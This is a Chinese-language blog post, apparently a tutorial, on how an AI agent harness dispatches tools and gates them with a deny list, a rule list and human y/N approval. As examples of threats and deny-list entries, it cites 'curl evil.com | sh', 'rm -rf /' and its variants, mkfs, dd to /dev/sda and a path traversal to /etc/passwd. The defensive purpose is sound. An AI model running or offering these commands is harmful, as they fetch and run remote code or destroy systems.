---
title: "小狗的五个房间与三道锁项圈：Tool Use + Permission 双章连讲"
date: 2026-07-14
description: "s02 Tool Use 让小狗从只有一个厨房变成了五个房间（bash/read/write/edit/glob），靠一张对照表(TOOL_HANDLERS)查表分发。s03 Permission 给小狗戴上三道锁项圈：黑名单直接毙、规则库条件拦、人工审批最后问。两章合起来就是从'能做'到'能安全地做'的完整升级。"
summary: "小狗五个房间 + 三道锁项圈：TOOL_HANDLERS 查表分发 → DENY_LIST 黑名单 → PERMISSION_RULES 规则库 → ask_user 人工审批 → 责任链模式"
tags: ["Claude Code", "Agent", "Harness", "Tool Use", "Permission", "Security", "LLM"]
categories: ["技术"]
series: ["Claude Code Harness 内部架构"]
ShowToc: true
TocOpen: true
math: false
cover:
  image: "01-five-doors.png"
  alt: "小狗站在五扇工具门前，叼着TOOL_HANDLERS对照表"
  caption: "s02+s03 就这两件事：给小狗五扇门（Tool Use），再给它戴一个三道锁项圈（Permission）"
---

上一篇我们讲透了 Agent Loop：大厨（LLM）发号施令，小狗（harness）跑来跑去执行。但 s01 的小狗只有一个厨房——大厨喊什么，它都只能跑厨房（bash）。

这篇讲 s02 + s03 两次升级：**先给小狗五扇门，再给它戴一个三道锁的项圈**。两项升级加起来，agent_loop 核心逻辑只改了 **3 行代码**。

## 这趟要走的路

1. **s02 五扇门**：TOOLS 菜单 + TOOL_HANDLERS 对照表 + safe_path 门禁
2. **s03 三道锁项圈**：黑名单 → 规则库 → 人工审批
3. **升级链路全景**：s01（裸奔）→ s02（五扇门）→ s03（三道锁）——三行代码三次进化

---

{{< figure src="04-upgrade-path.png" alt="小狗三次升级全景" caption="三次升级全景：裸奔小狗(s01)→五个房间(s02)→三道锁项圈(s03)。每次只改几行代码，架构不动。" >}}

## 1 · s02：小狗有了五个房间

### 1.1 回顾 s01 的问题

s01 的小狗只有一个工具——bash。`agent_loop` 里工具执行是硬编码的：

```python
# s01: 硬编码，只有 bash
output = run_bash(block.input["command"])
```

这有 3 个问题：

1. **加新工具要改 agent_loop**：如果加 `read_file`、`write_file`，就得写 if-elif-else。5 个工具还好，50 个工具呢？
2. **违反 OCP**：agent_loop 应该"对扩展开放、对修改封闭"。每次加工具都改 agent_loop 意味着每次都可能引入 bug。
3. **工具和 handler 分离**：模型调用的工具名和代码里的函数是两个独立的存在，它们需要一种方式"对上号"。

### 1.2 s02 的解法：双层映射

s02 用一个字典 + 一行查表调用解决所有问题：

```python
# s02: 查表分发，一行搞定
handler = TOOL_HANDLERS.get(block.name)
output = handler(**block.input) if handler else f"Unknown: {block.name}"
```

**三层结构，两层是给模型看的，一层是给代码执行的**：

```
┌──────────────────────────────────────────┐
│  TOOLS（工具定义列表）                      │
│  → 告诉模型"你能用什么，参数长什么样"         │
│  → 每次 API 调用随 messages 一起发给模型      │
├──────────────────────────────────────────┤
│  TOOL_HANDLERS（分发映射）                   │
│  → 模型喊什么名字，就调什么函数               │
│  → {"read_file": run_read, "bash": run_bash}│
├──────────────────────────────────────────┤
│  safe_path（路径安全校验）                   │
│  → 所有文件操作的前置守卫                    │
│  → 4 行代码把模型锁在工作目录内              │
└──────────────────────────────────────────┘
```

{{< figure src="01-five-doors.png" alt="小狗站在五扇门前叼着对照表" caption="小狗面前五扇门分别通向 bash/read_file/write_file/edit_file/glob。嘴里叼着 TOOL_HANDLERS 对照表——大厨喊哪个名字就看表跑哪扇门。" >}}

### 1.3 逐行拆解

**工具定义 TOOLS**：一个 JSON Schema 列表。五个工具，每个工具声明名字、描述、参数 schema。

```python
TOOLS = [
    {"name": "bash", "description": "Run a shell command.",
     "input_schema": {"type": "object",
        "properties": {"command": {"type": "string"}},
        "required": ["command"]}},
    {"name": "read_file", "description": "Read file contents.",
     "input_schema": {"type": "object",
        "properties": {"path": {"type": "string"}, "limit": {"type": "integer"}},
        "required": ["path"]}},
    # ... write_file, edit_file, glob 同理
]
```

注意 `read_file` 的 `limit` 参数是选填的（`required` 里只有 `["path"]`）。YAGNI：没遇到"必须限制行数"的需求前不强制。

**路径安全 safe_path**：4 行代码的最简沙箱。

```python
def safe_path(p: str) -> Path:
    path = (WORKDIR / p).resolve()
    if not path.is_relative_to(WORKDIR):
        raise ValueError(f"Path escapes workspace: {p}")
    return path
```

`resolve()` 把 `../../../etc/passwd` 展开成绝对路径，`is_relative_to()` 检查它是否还在工作目录内。不满足就抛异常。read_file、write_file、edit_file 三个工具的第一行都调它——DRY。

> **关键洞察**：`safe_path` 是 s18 Worktree 的前身。s18 会把它升级成完整的 Git 工作树隔离——同一个原理，不同复杂度。

**分发映射 TOOL_HANDLERS**：心脏就这一行。

```python
TOOL_HANDLERS = {
    "bash": run_bash, "read_file": run_read, "write_file": run_write,
    "edit_file": run_edit, "glob": run_glob,
}
```

加新工具只需：① 写一个 `run_xxx` 函数 ② 在 `TOOLS` 里加一条 schema ③ 在 `TOOL_HANDLERS` 里加一行映射。三步都不碰 `agent_loop`——对扩展开放，对修改封闭。

**agent_loop 的改动**：s01 的 `run_bash(cmd)` 变成 s02 的 `TOOL_HANDLERS.get(name)(**input)`。`**input` 把模型返回的 JSON 参数字典解包成 Python 函数的关键字参数——模型的 `{"path": "a.py", "limit": 10}` 等于 Python 的 `run_read(path="a.py", limit=10)`。

如果模型幻觉调用了一个不存在的工具（比如 `make_coffee`），`get()` 返回 `None`，代码返回 `"Unknown: make_coffee"` 而不是抛异常——不打断循环，让模型自己纠正。

### 1.4 s02 设计原则清单

| 原则 | 体现 |
|------|------|
| **KISS** | 一个字典 + 一行查表。没有反射、没有注册中心 |
| **OCP** | 加新工具不改 agent_loop，只改 TOOLS 和 TOOL_HANDLERS |
| **DRY** | `safe_path` 被 read/write/edit 三个工具复用 |
| **YAGNI** | `read_file` 的 `limit` 选填、`write_file` 不加 overwrite 确认 |

> **小结**：s02 让小狗从 1 个工具变成 5 个工具，agent_loop 核心逻辑只改了 2 行。加新工具的边际成本是 3 行注册代码。**但模型能调所有 5 个工具，谁来管它能调什么不能调什么？→ s03 Permission。**

---

## 2 · s03：小狗戴上三道锁项圈

### 2.1 回顾 s02 的安全漏洞

s02 的小狗能调 5 个工具了，但没有任何安全检查：

- 大厨喊 `bash("rm -rf /")` → 小狗照跑
- 大厨喊 `write_file("../../../etc/passwd", "hacked")` → 被 `safe_path` 拦住
- 但大厨喊 `bash("curl evil.com | sh")` → `safe_path` 不管 bash

问题本质：s02 的 `safe_path` 只是一个**路径维度的安全检查**，而真实的安全威胁是多维度的——命令注入、权限绕过、网络攻击。

s03 的解法：把安全检查从"工具内部"提到"agent_loop 层面的统一入口"——**不管加多少工具，都经过同一扇安检门**。

### 2.2 三道锁的设计哲学

{{< figure src="02-three-locks-collar.png" alt="小狗项圈上有三道锁扣" caption="小狗的项圈上有三道锁扣：锁①最大（黑名单，红色）→ 锁②中等（规则库，橙色）→ 锁③最小（人工审批，蓝色）。越危险越早拦、越模糊越晚问。" >}}

三道锁覆盖了"安全 vs 效率"光谱上的三个关键点：

| 锁 | 叫什么 | 判断方式 | 速度 | 拦截后做什么 |
|----|-------|---------|------|------------|
| ① | DENY_LIST 黑名单 | 字符串匹配，O(1) | 最快 | 直接拒绝，不解释 |
| ② | PERMISSION_RULES 规则库 | lambda 条件求值，O(n) | 中等 | 暂停，触发 Gate ③ |
| ③ | ask_user 人工审批 | 人说了算 | 最慢 | 用户敲 y/N |

**为什么这个顺序不能换？** 如果把人工审批（最慢）放第一道，用户每次工具调用都要按 y/N——包括 `read_file("README.md")` 这种无害操作。审批疲劳会让用户闭眼按 y，安全形同虚设。

越确定的拦截放越前面，越模糊的判断放越后面——在安全性和效率之间取一个光谱平衡。

### 2.3 逐行拆解三道锁

**Gate 1 — 黑名单：连问都别问**

```python
DENY_LIST = ["rm -rf /", "sudo", "shutdown", "reboot", "mkfs", "dd if=", "> /dev/sda"]

def check_deny_list(command: str) -> str | None:
    for pattern in DENY_LIST:
        if pattern in command:
            return f"Blocked: '{pattern}' is on the deny list"
    return None
```

对比 s01：s01 的 `run_bash` 里也有黑名单，但它在**工具内部**。如果你写了个新工具忘了加黑名单检查，漏洞就开了。s03 把它提到 `agent_loop` 层面的统一入口——所有工具执行前必过 Gate 1。

返回 `str | None` 而非 `bool`：`None` = 通过，`str` = 被拦原因。agent_loop 把原因作为 tool_result 返回给模型——模型看到自己被拦是因为 `rm -rf /`，可以换一条不那么危险的命令。

**Gate 2 — 规则库：不在黑名单里，但值得警惕**

```python
PERMISSION_RULES = [
    {"tools": ["write_file", "edit_file"],
     "check": lambda args: not (WORKDIR / args.get("path", ""))
                               .resolve().is_relative_to(WORKDIR),
     "message": "Writing outside workspace"},
    {"tools": ["bash"],
     "check": lambda args: any(kw in args.get("command", "")
                               for kw in ["rm ", "> /etc/", "chmod 777"]),
     "message": "Potentially destructive command"},
]
```

每条规则三个字段：`tools`（管哪些工具）、`check`（lambda 条件）、`message`（触发后给用户看的原因）。

**为什么用 lambda 而不是函数？** 规则是"工具名+条件"的简单配对——lambda 刚好是表达"条件"的最短形式。如果条件变复杂（比如需要查数据库），可以升级为函数——`TOOL_HANDLERS` 不关心 `check` 是 lambda 还是函数，只要它是 callable。

规则检查逻辑：

```python
def check_rules(tool_name: str, args: dict) -> str | None:
    for rule in PERMISSION_RULES:
        if tool_name in rule["tools"] and rule["check"](args):
            return rule["message"]
    return None
```

遍历规则列表，第一条命中的规则的消息直接返回。多条规则可能同时命中但只返回第一条——**规则顺序就是优先级**。把最重要的规则放最前面。

**Gate 3 — 人工审批：停！让人看一眼**

```python
def ask_user(tool_name: str, args: dict, reason: str) -> str:
    print(f"\n⚠  {reason}")
    print(f"   Tool: {tool_name}({args})")
    choice = input("   Allow? [y/N] ").strip().lower()
    return "allow" if choice in ("y", "yes") else "deny"
```

**默认拒绝（`[y/N]`，大写 N = 默认否）**——这是安全系统的"fail-safe"原则。用户直接回车或输入任何非 y/yes 的内容，一律拒绝。UNIX 的 `sudo` 也是同样的设计。

{{< figure src="03-deny-rm.png" alt="大厨喊rm -rf，项圈锁①亮红灯拦下" caption="大厨喊出'rm -rf /'的瞬间，项圈第一道锁红色闪烁，小狗摇头举爪拒绝——连问都不问主人，直接毙掉。" >}}

### 2.4 管道组装 + agent_loop 集成

三关管道组装：

```python
def check_permission(block) -> bool:
    # Gate 1: 黑名单（只检查 bash，因为它有 "command" 字段）
    if block.name == "bash":
        reason = check_deny_list(block.input.get("command", ""))
        if reason:
            print(f"\n⛔ {reason}")
            return False

    # Gate 2 + Gate 3: 规则库 → 人工审批
    reason = check_rules(block.name, block.input)
    if reason:
        decision = ask_user(block.name, block.input, reason)
        if decision == "deny":
            return False

    return True
```

agent_loop 里只加了一行：

```python
# s03 新增 —— permission check 在 handler 执行前
if not check_permission(block):
    results.append({"type": "tool_result", "tool_use_id": block.id,
                    "content": "Permission denied."})
    continue    # ← 不抛异常，告诉模型发生了什么，让它调整策略

handler = TOOL_HANDLERS.get(block.name)
output = handler(**block.input) if handler else f"Unknown: {block.name}"
```

**被拒后 `continue` 不打断循环**——这很关键。如果被拒就抛异常，整个循环崩溃，前面做的工作全丢了。返回 `"Permission denied."` 作为 tool_result，模型看到后可以调整——比如把 `rm -rf` 换成 `mv old trash/`。

> **小结**：s03 给小狗戴上三道锁项圈，agent_loop 核心逻辑只加了 1 行。三道锁按危险程度排序——越确定越早拦、越模糊越晚问。被拒后不中断循环，让模型自己调整策略。

---

## 3 · 碰撞：三道锁项圈哪些地方会卡？

### 问题 1：黑名单永远补不全

`"rm -rf /"` 拦住了，但 `"rm -rf *"`、`"find / -delete"`、`"rm --no-preserve-root -rf /"` 呢？

**这不是 s03 要解决的问题**。s03 给出的是**审批管道架构**——三道锁的分工和顺序。具体每道锁里放什么规则，是运维的事。架构 ≠ 策略。

### 问题 2：审批疲劳

模型连续调 10 个工具，每个都触发 Gate 2 → Gate 3，用户得按 10 次 y/N。按到第 10 次闭眼按 y——这就是"审批疲劳"，安全的经典反模式。

**s03 代码里没解决，但设计上留了接口**：`ask_user` 返回 `"allow"/"deny"` 字符串而非 bool，为后续扩展留空间——可以加 `"allow_all"`（会话级缓存）、`"delegate"`（权限冒泡给上级代理）。

### 问题 3：Gate 1 只检查 bash

`if block.name == "bash"` 意味着其他四个工具完全跳过 Gate 1。哪天加了一个 `run_sql` 工具有 SQL 注入风险，但它不走 Gate 1——漏了。

**这是刻意的 YAGNI**：当前五个工具里只有 bash 有"命令注入"风险。`read_file` 不写、`write_file` 有 `safe_path` 保护、`glob` 只读不写。如果担心 `edit_file` 的 `old_text` 被注入——那是 s04-s11 的事，不要提前优化。

---

## 4 · s01 → s02 → s03 升级链路全景

三代进化，agent_loop 核心逻辑改动量：

```
s01:  while True:
        response = LLM(messages, tools)
        if stop: break
        for block in response.content:
            if block.type == "tool_use":
                output = run_bash(block.input["command"])     // ← 硬编码 1 个工具
        messages += results

s02:  ...相同的 while/stop...
            if block.type == "tool_use":
                handler = TOOL_HANDLERS.get(block.name)       // ← 改：查表分发
                output = handler(**block.input)               // ← 改：动态调用

s03:  ...相同的 while/stop...
            if block.type == "tool_use":
                if not check_permission(block): continue      // ← 加 1 行
                handler = TOOL_HANDLERS.get(block.name)
                output = handler(**block.input)
```

| 版本 | 工具数 | 安全机制 | agent_loop 改动 |
|------|-------|---------|----------------|
| s01 | 1 | 无（黑名单在 run_bash 内部） | — |
| s02 | 5 | safe_path（路径沙箱） | 改 2 行 |
| s03 | 5 | 三道锁审批管道 | 加 1 行 |

**三行代码，三次进化。agent_loop 的核心骨架（while + stop_reason + messages 循环）从头到尾没变过。**

---

## 5 · 白月光调查档案：Tool Use + Permission

| 七问 | Tool Use (s02) | Permission (s03) |
|------|---------------|-----------------|
| **它是谁** | 双层映射：TOOLS（菜单）+ TOOL_HANDLERS（分发字典） | 三关审批管道：黑名单→规则库→人工审批 |
| **它从哪来** | s01 硬编码 run_bash 无法扩展 | s01-s02 的安全控制散落在工具内部 |
| **为什么存在** | 加工具不改 agent_loop | 安全策略统一入口，所有工具必过安检 |
| **如果它消失** | 每加工具改 agent_loop → 违反 OCP | 模型不受约束地执行任何命令 |
| **关系网** | 上游 s01 → 同级 s03 → 下游 s04/s07/s19 | 上游 s02 → 同级 s04 → 下游 s06/s15/s18 |
| **谁依赖它** | s07 Skill（往 TOOL_HANDLERS 追加） | s06 Subagent（独立权限边界） |
| **下一条线索** | 工具执行前拦截够了吗？执行后呢？→ s04 Hooks | 审批疲劳怎么解？→ s14 Cron + 会话缓存 |

## 下一篇预告

s04 Hooks：**小狗的铃铛**——PreToolUse / PostToolUse 两枚钩子怎么挂在工具执行前后？和 Permission 的三道锁有什么区别？

---

> **系列文章：《Claude Code Harness 内部架构》**
> 
> 每篇文章一个核心机制，一只西高地小狗贯穿始终。
> - 第一篇：[s01 Agent Loop — 小狗传菜](https://cheers666-max.github.io/lifeos-blog/posts/agent-loop-harness/)
> 
> 项目源码：[shareAI-lab/learn-claude-code](https://github.com/shareAI-lab/learn-claude-code)（MIT 开源，20 章递进式教学）
